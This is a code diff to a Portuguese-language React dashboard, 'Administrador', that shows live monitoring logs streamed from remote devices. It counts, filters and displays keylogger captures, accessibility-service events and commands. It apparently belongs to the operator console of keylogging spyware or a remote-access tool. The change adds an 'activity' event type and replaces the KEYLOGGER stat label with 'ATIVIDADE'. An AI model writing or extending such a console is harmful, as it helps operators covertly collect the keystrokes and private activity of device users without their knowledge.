@@ -14,6 +14,7 @@ interface LogEntry {
 
 function typeColor(type: string) {
   switch (type) {
+    case "activity": return G;
     case "keylog": return G;
     case "accessibility": return "#44aaff";
     case "connection": return "#ffaa00";
@@ -27,14 +28,13 @@ export default function Administrador() {
   const socket = useSocket();
   const [logs, setLogs] = useState<LogEntry[]>([]);
   const [keylogFilter, setKeylogFilter] = useState("");
-  const [activeTab, setActiveTab] = useState<"keylogger" | "accessibility" | "all">("all");
+  const [activeTab, setActiveTab] = useState<"keylogger" | "accessibility" | "activity" | "all">("all");
   const bottomRef = useRef<HTMLDivElement>(null);
   const counter = useRef(0);
 
   useEffect(() => {
-    // Fetch initial events
     fetch("/api/events?limit=100", { credentials: "include" })
-      .then(r => r.json())
+      .then((r) => r.json())
       .then((data: any[]) => {
         setLogs(data.map((e, i) => ({ ...e, id: i })));
       })
@@ -44,11 +44,11 @@ export default function Administrador() {
   useEffect(() => {
     const handle = (data: any) => {
       counter.current += 1;
-      setLogs(prev => [
+      setLogs((prev) => [
         {
           id: counter.current,
-          deviceName: data.deviceName || "UNKNOWN",
-          type: data.type,
+          deviceName: data.deviceName || "APP",
+          type: data.type || "activity",
           message: data.message,
           createdAt: data.createdAt || new Date().toISOString(),
         },
@@ -56,35 +56,39 @@ export default function Administrador() {
       ]);
     };
     socket.on("event:new", handle);
-    return () => { socket.off("event:new", handle); };
+    return () => {
+      socket.off("event:new", handle);
+    };
   }, [socket]);
 
   const filtered = logs.filter((l) => {
     const matchTab =
       activeTab === "all" ||
       (activeTab === "keylogger" && l.type === "keylog") ||
-      (activeTab === "accessibility" && l.type === "accessibility");
+      (activeTab === "accessibility" && l.type === "accessibility") ||
+      (activeTab === "activity" && l.type === "activity");
     const matchSearch = keylogFilter === "" || l.message.toLowerCase().includes(keylogFilter.toLowerCase());
     return matchTab && matchSearch;
   });
 
-  const keylogCount = logs.filter(l => l.type === "keylog").length;
-  const accCount = logs.filter(l => l.type === "accessibility").length;
+  const activityCount = logs.filter((l) => l.type === "activity").length;
+  const keylogCount = logs.filter((l) => l.type === "keylog").length;
+  const accCount = logs.filter((l) => l.type === "accessibility").length;
 
   return (
     <Layout>
       <TopBar title="ADMINISTRADOR // LOGS DE MONITORAMENTO">
+        <span style={{ color: G }}>{activityCount} ATIV.</span>
         <span style={{ color: G }}>{keylogCount} KEYLOGS</span>
         <span style={{ color: "#44aaff" }}>{accCount} ACC</span>
       </TopBar>
 
-      {/* Stats */}
       <div style={{ display: "grid", gridTemplateColumns: "repeat(4, 1fr)", gap: 8, marginBottom: 12 }}>
         {[
           { label: "TOTAL LOGS", value: logs.length, color: G },
-          { label: "KEYLOGGER", value: keylogCount, color: G },
+          { label: "ATIVIDADE", value: activityCount, color: G },
           { label: "ACESSIBILIDADE", value: accCount, color: "#44aaff" },
-          { label: "COMANDOS", value: logs.filter(l => l.type === "command").length, color: "#aa88ff" },
+          { label: "COMANDOS", value: logs.filter((l) => l.type === "command").length, color: "#aa88ff" },
         ].map((s) => (
           <Panel key={s.label} style={{ padding: "8px 12px" }}>
             <div style={{ fontSize: 8, color: "#445", letterSpacing: "0.1em", marginBottom: 4 }}>{s.label}</div>
@@ -93,9 +97,8 @@ export default function Administrador() {
         ))}
       </div>
 
-      {/* Filter bar */}
       <div style={{ display: "flex", gap: 8, marginBottom: 10, alignItems: "center" }}>
-        {(["all", "keylogger", "accessibility"] as const).map((tab) => (
+        {(["all", "activity", "keylogger", "accessibility"] as const).map((tab) => (
           <button
             key={tab}
             onClick={() => setActiveTab(tab)}
@@ -111,7 +114,7 @@ export default function Administrador() {
               letterSpacing: "0.1em",
             }}
           >
-            {tab === "all" ? "TODOS" : tab === "keylogger" ? "KEYLOGGER" : "ACESSIBILIDADE"}
+            {tab === "all" ? "TODOS" : tab.toUpperCase()}
           </button>
         ))}
         <input
@@ -146,7 +149,6 @@ export default function Administrador() {
         </button>
       </div>
 
-      {/* Log table */}
       <Panel style={{ height: "calc(100vh - 300px)", display: "flex", flexDirection: "column" }}>
         <PanelHeader>
           <span>&gt; LOG STREAM [{filtered.length}]</span>
